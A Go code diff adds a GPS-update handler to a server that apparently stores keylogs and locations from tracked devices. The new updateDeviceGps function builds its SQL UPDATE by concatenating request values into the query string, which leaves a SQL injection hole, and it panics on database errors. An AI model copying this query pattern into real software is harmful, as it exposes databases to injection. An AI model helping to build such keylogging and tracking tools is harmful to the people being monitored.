@@ -146,6 +146,14 @@ func processRequest(req *CustomProtocol.Request) {
 		res[0] = 1
 		req.Response <- res
 	case CustomProtocol.UpdateDeviceGPS:
+		updated := updateDeviceGps(payload[0], payload[1], payload[2])
+		res := make([]byte, 2)
+		if updated == true {
+			res[0] = 1
+		} else {
+			res[0] = 0
+		}
+		req.Response <- res
 	case CustomProtocol.UpdateDeviceIP:
 	case CustomProtocol.UpdateDeviceKeylog:
 	case CustomProtocol.VerifyLoginCredentials:
@@ -407,6 +415,32 @@ func UpdateKeylog(deviceId string, keylog string) bool {
 	disconnect(db)
 
 	return bool1
+}
+
+/*
+*
+*
+*
+* Steven Whaley Mar, 23 - created
+*
+*/
+
+func updateDeviceGps(deviceId string, latitude string, longitude string) bool {
+    bool1 := true
+
+    db := connect()
+ 
+    rows, res, err := db.Query("UPDATE gpsDevice SET latitude = '" +  latitude + "', longitude = '" + longitude + "' WHERE id = '" + deviceId + "'")
+    rows = rows
+    res = res
+
+    if err != nil {
+    panic(err)
+    }
+
+    disconnect(db)
+
+    return bool1
 }
 
 /*
